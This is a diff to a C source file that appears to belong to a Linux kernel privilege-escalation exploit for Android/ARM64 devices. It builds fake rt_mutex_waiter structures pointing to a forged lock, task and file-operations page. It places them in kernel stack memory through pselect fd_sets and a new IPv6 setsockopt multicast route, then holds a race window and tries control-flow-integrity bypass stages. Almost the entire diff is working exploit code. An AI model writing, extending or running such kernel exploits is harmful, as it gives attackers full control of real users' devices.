@@ -1,4 +1,5 @@
 #include "common.h"
+#include <netinet/in.h>
 #include <time.h>
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
@@ -141,29 +142,38 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 
   int words_per_set = pselect_words_per_set();
   struct pselect_waiter_word {
-    int word;
+    size_t off;
     uint64_t value;
     const char *name;
   } words[] = {
-    {2, 0, "tree_pc"},
-    {3, 0, "tree_right"},
-    {4, 0, "tree_left"},
-    {5, 1, "tree_prio"},
-    {6, 0, "tree_deadline"},
-    {7, 0, "pi_parent"},
-    {8, 0, "pi_right"},
-    {9, 0, "pi_left"},
-    {10, 1, "pi_prio"},
-    {11, 0, "pi_deadline"},
-    {12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
+    {0x00, 0, "tree_pc"},
+    {0x08, 0, "tree_right"},
+    {0x10, 0, "tree_left"},
+    {FAKE_WAITER_TREE_PRIO_OFF, 1, "tree_prio"},
+    {FAKE_WAITER_TREE_DEADLINE_OFF, 0, "tree_deadline"},
+    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0, "pi_parent"},
+    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0, "pi_right"},
+    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0, "pi_left"},
+    {FAKE_WAITER_PI_TREE_PRIO_OFF, 1, "pi_prio"},
+    {FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0, "pi_deadline"},
+    {FAKE_WAITER_TASK_OFF,
+     pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
      "task"},
-    {13, fake_lock, "lock"},
-    {14, 3, "wake_state"},
+    {FAKE_WAITER_LOCK_OFF, fake_lock, "lock"},
+    {FAKE_WAITER_WAKE_STATE_OFF, 3, "wake_state"},
   };
+  /* 5.15 packs wake_state (u32) and the shared prio (u32) into one qword;
+   * the wake_state entry must stay last so its combined value wins. */
+  if (FAKE_WAITER_WAKE_STATE_OFF + 4 == FAKE_WAITER_PI_TREE_PRIO_OFF &&
+      (FAKE_WAITER_PI_TREE_PRIO_OFF & 7) == 4) {
+    words[sizeof(words) / sizeof(words[0]) - 1].value =
+      ((uint64_t)1 << 32) | 3;
+  }
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
     struct pselect_waiter_word *w = &words[i];
     pselect_put_waiter_word(
-        in, out, ex, words_per_set, w->word, w->value, w->name);
+        in, out, ex, words_per_set, (int)(w->off / 8) + 2,
+        w->value, w->name);
   }
 }
 
@@ -261,8 +271,13 @@ void do_pselect_fake_lock_route(void) {
 
     calls = atomic_load(&consumer_calls);
     success = atomic_load(&consumer_success);
-    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
-            route_attempt, ret, saved_errno, calls, success, delay_usec);
+    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
+            "delay=%d sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
+            route_attempt, ret, saved_errno, calls, success, delay_usec,
+            atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
+            atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
+            atomic_load(&consumer_futex_locked),
+            atomic_load(&consumer_futex_entered));
 
     int route_quality_miss = 0;
     int route_signal = calls > 0 && success > 0;
@@ -314,8 +329,264 @@ void do_pselect_fake_lock_route(void) {
     pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
             route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
   }
-  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
-          calls, success, cfi_last_step, cfi_last_errno);
+  pr_info("pselect route done calls=%d success=%d step=%d errno=%d "
+          "sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
+          calls, success, cfi_last_step, cfi_last_errno,
+          atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
+          atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
+          atomic_load(&consumer_futex_locked),
+          atomic_load(&consumer_futex_entered));
+}
+
+static int mcast_payload_off(void) {
+  return active_offsets ? (int)active_offsets->mcast_payload_off : 0;
+}
+
+/* Some vendor contexts (e.g. HyperOS apps without the INTERNET permission,
+ * or hardened seccomp arg filters) return EPERM for specific family/type/
+ * protocol combinations. Walk a flavor list, keep the first IPv6 socket that
+ * opens, and log every miss so a blanket socket() ban is easy to tell apart
+ * from a family-specific one. */
+static int mcast_open_socket(void) {
+  struct mcast_sock_flavor {
+    int family;
+    int type;
+    int proto;
+    const char *name;
+  } flavors[] = {
+    {AF_INET6, SOCK_DGRAM, 0, "AF_INET6/SOCK_DGRAM/0"},
+    {AF_INET6, SOCK_DGRAM, IPPROTO_UDP, "AF_INET6/SOCK_DGRAM/UDP"},
+    {AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0, "AF_INET6/SOCK_DGRAM|CLOEXEC/0"},
+    {AF_INET6, SOCK_STREAM, 0, "AF_INET6/SOCK_STREAM/0"},
+    {AF_INET6, SOCK_STREAM, IPPROTO_TCP, "AF_INET6/SOCK_STREAM/TCP"},
+    {AF_INET6, SOCK_RAW, IPPROTO_ICMPV6, "AF_INET6/SOCK_RAW/ICMPV6"},
+  };
+  int last_errno = EPERM;
+  for (size_t i = 0; i < sizeof(flavors) / sizeof(flavors[0]); i++) {
+    int fd = socket(flavors[i].family, flavors[i].type, flavors[i].proto);
+    if (fd >= 0) {
+      pr_info("mcast socket ok via %s fd=%d\n", flavors[i].name, fd);
+      return fd;
+    }
+    last_errno = errno;
+    pr_info("mcast socket miss %s errno=%d (%s)\n",
+            flavors[i].name, errno, strerror(errno));
+  }
+  int probe4 = socket(AF_INET, SOCK_DGRAM, 0);
+  if (probe4 >= 0) {
+    pr_info("mcast probe: AF_INET/SOCK_DGRAM ok, IPv6-specific block\n");
+    close(probe4);
+  } else {
+    pr_info("mcast probe: AF_INET/SOCK_DGRAM errno=%d (%s)\n",
+            errno, strerror(errno));
+  }
+  int probeux = socket(AF_UNIX, SOCK_DGRAM, 0);
+  if (probeux >= 0) {
+    pr_info("mcast probe: AF_UNIX/SOCK_DGRAM ok, family-specific block\n");
+    close(probeux);
+  } else {
+    pr_info("mcast probe: AF_UNIX/SOCK_DGRAM errno=%d (%s)\n",
+            errno, strerror(errno));
+  }
+  errno = last_errno;
+  return -1;
+}
+
+void prepare_mcast_payload(unsigned char *payload, size_t len) {
+  memset(payload, 0, len);
+  size_t base = (size_t)mcast_payload_off();
+  if (!base || base + FAKE_WAITER_WW_CTX_OFF + 8 > len) {
+    pr_warning("mcast waiter offset %zu does not fit in %zu-byte copy\n",
+               base, len);
+    return;
+  }
+  /* Same fake rt_mutex_waiter words as the pselect fd_set route; the mcast
+   * route places them inside the 264-byte setsockopt(IPPROTO_IPV6, 46) copy
+   * at the derived mcast_payload_off instead of the select fd_set. */
+  struct mcast_waiter_word {
+    size_t off;
+    uint64_t value;
+    const char *name;
+  } words[] = {
+    {0x00, 0, "tree_pc"},
+    {0x08, 0, "tree_right"},
+    {0x10, 0, "tree_left"},
+    {FAKE_WAITER_TREE_PRIO_OFF, 1, "tree_prio"},
+    {FAKE_WAITER_TREE_DEADLINE_OFF, 0, "tree_deadline"},
+    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0, "pi_parent"},
+    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0, "pi_right"},
+    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0, "pi_left"},
+    {FAKE_WAITER_PI_TREE_PRIO_OFF, 1, "pi_prio"},
+    {FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0, "pi_deadline"},
+    {FAKE_WAITER_TASK_OFF,
+     pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
+     "task"},
+    {FAKE_WAITER_LOCK_OFF, fake_lock, "lock"},
+    {FAKE_WAITER_WAKE_STATE_OFF, 3, "wake_state"},
+  };
+  /* 5.15 packs wake_state (u32) and the shared prio (u32) into one qword;
+   * the wake_state entry must stay last so its combined value wins. */
+  if (FAKE_WAITER_WAKE_STATE_OFF + 4 == FAKE_WAITER_PI_TREE_PRIO_OFF &&
+      (FAKE_WAITER_PI_TREE_PRIO_OFF & 7) == 4) {
+    words[sizeof(words) / sizeof(words[0]) - 1].value =
+      ((uint64_t)1 << 32) | 3;
+  }
+  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
+    size_t qword = words[i].off / 8;
+    size_t pos = base + qword * 8;
+    if (pos + 8 > len) {
+      pr_warning("mcast %s at +0x%zx exceeds payload\n",
+                 words[i].name, pos);
+      continue;
+    }
+    memcpy(payload + pos, &words[i].value, sizeof(words[i].value));
+  }
+}
+
+void do_mcast_fake_lock_route(void) {
+  if (!page_base || !fake_lock || !fake_fops) {
+    cfi_last_step = 40;
+    cfi_last_errno = 0;
+    pr_error("mcast route missing kernel page base=%016zx lock=%016zx "
+             "fops=%016zx\n", page_base, fake_lock, fake_fops);
+    return;
+  }
+  int sock = mcast_open_socket();
+  if (sock < 0) {
+    cfi_last_step = 41;
+    cfi_last_errno = errno;
+    pr_error("mcast route: no IPv6 socket available (last errno=%d %s)\n",
+             errno, strerror(errno));
+    return;
+  }
+
+  struct timespec route_t0;
+  clock_gettime(CLOCK_MONOTONIC, &route_t0);
+  int calls = 0;
+  int success = 0;
+  int route_verified = 0;
+  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
+       route_attempt++) {
+    if (route_attempt != 1) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      if (!page_base || !fake_lock || !fake_fops) {
+        cfi_last_step = 42;
+        cfi_last_errno = errno;
+        pr_error("mcast retry page prepare failed attempt=%d base=%016zx "
+                 "lock=%016zx fops=%016zx\n",
+                 route_attempt, page_base, fake_lock, fake_fops);
+        break;
+      }
+    }
+
+    unsigned char payload[MCAST_ROUTE_COPY_LEN];
+    prepare_mcast_payload(payload, sizeof(payload));
+    pr_info("mcast route setup attempt=%d payload_off=0x%x page=%016zx "
+            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx\n",
+            route_attempt, mcast_payload_off(),
+            page_base, fake_lock, fake_w0, fake_task);
+
+    atomic_store(&consumer_calls, 0);
+    atomic_store(&consumer_success, 0);
+    atomic_store(&punch_consume_stop, 0);
+    int delay_usec = route_delay_usec(route_attempt);
+    atomic_store(&main_route_delay_usec, delay_usec);
+    atomic_store(&punch_consume_go, route_attempt);
+
+    pr_info("mcast pre-setsockopt +%.0fms\n", fops_elapsed_ms(&route_t0));
+    errno = 0;
+    int ret = setsockopt(sock, IPPROTO_IPV6, MCAST_ROUTE_OPTNAME,
+                         payload, sizeof(payload));
+    int saved_errno = errno;
+    pr_info("mcast post-setsockopt +%.0fms ret=%d errno=%d\n",
+            fops_elapsed_ms(&route_t0), ret, saved_errno);
+
+    /* The 264-byte copy persists on this thread's kernel stack until the
+     * next deep syscall, so hold the punch window in userspace (the mirror
+     * of select() blocking in the pselect route). clock_gettime is served
+     * by the vDSO, so no syscall touches the stack region here. */
+    struct timespec window = {
+      .tv_sec = PSELECT_TIMEOUT_SEC,
+#ifdef PSELECT_TIMEOUT_USEC
+      .tv_nsec = PSELECT_TIMEOUT_USEC * 1000L,
+#else
+      .tv_nsec = 0,
+#endif
+    };
+    struct timespec until;
+    clock_gettime(CLOCK_MONOTONIC, &until);
+    until.tv_sec += window.tv_sec;
+    until.tv_nsec += window.tv_nsec;
+    if (until.tv_nsec >= 1000000000L) {
+      until.tv_sec++;
+      until.tv_nsec -= 1000000000L;
+    }
+    for (;;) {
+      struct timespec now;
+      clock_gettime(CLOCK_MONOTONIC, &now);
+      if (now.tv_sec > until.tv_sec ||
+          (now.tv_sec == until.tv_sec && now.tv_nsec >= until.tv_nsec)) {
+        break;
+      }
+      __asm__ volatile("yield" ::: "memory");
+    }
+    atomic_store(&punch_consume_go, 0);
+
+    calls = atomic_load(&consumer_calls);
+    success = atomic_load(&consumer_success);
+    pr_info("mcast window done attempt=%d ret=%d errno=%d calls=%d "
+            "success=%d delay=%d sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
+            route_attempt, ret, saved_errno, calls, success, delay_usec,
+            atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
+            atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
+            atomic_load(&consumer_futex_locked),
+            atomic_load(&consumer_futex_entered));
+
+    int route_quality_miss = 0;
+    int route_signal = calls > 0 && success > 0;
+    if (route_signal) {
+      if (pselect_custom_write_enabled()) {
+        cfi_last_step = 0;
+        cfi_last_errno = 0;
+        route_verified = 1;
+      } else if (try_cfi_stage()) {
+        cfi_last_step = 0;
+        route_verified = 1;
+      } else if (!cfi_last_step) {
+        cfi_last_step = 43;
+      }
+    }
+    if (!route_verified && route_signal) {
+      route_quality_miss = 1;
+      if (cfi_last_step == 43) {
+        cfi_last_step = 35;
+      }
+      pr_info("mcast route quality miss attempt=%d/%d delay=%d; "
+              "refreshing FOPS page\n",
+              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, delay_usec);
+    } else if (!route_verified) {
+      cfi_last_step = 44;
+      cfi_last_errno = saved_errno;
+    }
+
+    if (route_quality_miss) {
+      continue;
+    }
+    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
+      break;
+    }
+    pr_info("mcast cfi write miss attempt=%d/%d errno=%d; "
+            "refreshing FOPS page\n",
+            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
+  }
+  close(sock);
+  pr_info("mcast route done calls=%d success=%d step=%d errno=%d "
+          "sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
+          calls, success, cfi_last_step, cfi_last_errno,
+          atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
+          atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
+          atomic_load(&consumer_futex_locked),
+          atomic_load(&consumer_futex_entered));
 }
 
 int repair_fake_fops_llseek(int fd) {
@@ -582,4 +853,3 @@ fail:
   SYSCHK(close(fd));
   return 0;
 }
-
